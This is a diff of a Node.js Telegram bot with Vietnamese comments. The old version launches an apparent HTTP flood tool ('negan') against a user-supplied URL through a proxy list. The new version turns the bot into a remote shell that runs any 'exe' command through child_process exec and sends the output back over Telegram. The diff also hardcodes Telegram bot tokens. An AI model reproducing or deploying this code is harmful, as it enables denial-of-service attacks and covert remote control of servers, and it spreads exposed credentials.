@@ -2,7 +2,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const { exec } = require('child_process');
 const os = require('os');
 
-const token = '7534473375:AAGKcCgei3aIDZ_10G1kgPcC51ZHv-R31cg';
+const token = '7534473375:AAFqGHiHPT0HyzmAkQ7TxoYTFL3KVU0SdEM';
 const bot = new TelegramBot(token, { polling: true });
 const adminId = 7371969470;
 
@@ -40,18 +40,29 @@ Thông số còn trống: ❤️
 bot.on('message', (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text;
-    if (chatId !== adminId) return bot.sendMessage(chatId, 'Bạn không có quyền thực hiện lệnh này.');
 
-    const parts = text.split(' ');
-    if (parts.length !== 2 || !parts[0].startsWith('http')) return bot.sendMessage(chatId, 'Sai định dạng! Nhập theo: <URL> <time>.');
-    const [host, time] = parts;
-    if (!host.startsWith('http://') && !host.startsWith('https://')) return bot.sendMessage(chatId, 'URL không hợp lệ! Cần có http:// hoặc https://.');
+    // Chỉ admin mới được thực hiện lệnh
+    if (chatId !== adminId) {
+        return bot.sendMessage(chatId, 'Bạn không có quyền thực hiện lệnh này.');
+    }
 
-    const command = `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`;
+    // Kiểm tra xem lệnh có bắt đầu bằng "exe" không
+    if (!text.startsWith('exe ')) {
+        return bot.sendMessage(chatId, 'Lệnh không hợp lệ. Vui lòng bắt đầu lệnh với "exe".');
+    }
+
+    // Lấy lệnh thực tế (bỏ qua "exe ")
+    const command = text.slice(4).trim();
+
+    // Nếu lệnh trống sau khi bỏ "exe"
+    if (!command) {
+        return bot.sendMessage(chatId, 'Lệnh không được để trống. Ví dụ: "exe ls"');
+    }
+
     console.log(`[DEBUG] Lệnh được thực thi: ${command}`);
 
-    // Gửi thông báo thành công ngay lập tức
-    bot.sendMessage(chatId, `🚀 Lệnh đã được gửi thành công: ${command}`);
+    // Gửi thông báo đang thực thi lệnh
+    bot.sendMessage(chatId, `🚀 Đang thực thi lệnh: \`${command}\``);
 
     // Sử dụng exec để thực thi lệnh
     const child = exec(command);
@@ -60,7 +71,7 @@ bot.on('message', (msg) => {
     const handleOutput = (data, type) => {
         const output = data.toString();
         console.log(`[DEBUG] ${type}: ${output}`); // Debug ra console
-        bot.sendMessage(chatId, `[${type}] ${output}`); // Gửi về Telegram
+        bot.sendMessage(chatId, JSON.stringify({ type, output }, null, 2)); // Gửi về Telegram dưới dạng JSON
     };
 
     child.stdout.on('data', (data) => handleOutput(data, 'stdout'));
@@ -69,6 +80,6 @@ bot.on('message', (msg) => {
     // Xử lý khi lệnh kết thúc
     child.on('close', (code) => {
         console.log(`[DEBUG] Lệnh đã kết thúc với mã thoát: ${code}`);
-        bot.sendMessage(chatId, `✅ Lệnh đã hoàn thành với mã thoát: ${code}`);
+        bot.sendMessage(chatId, JSON.stringify({ exitCode: code }, null, 2)); // Gửi mã thoát về Telegram dưới dạng JSON
     });
 });
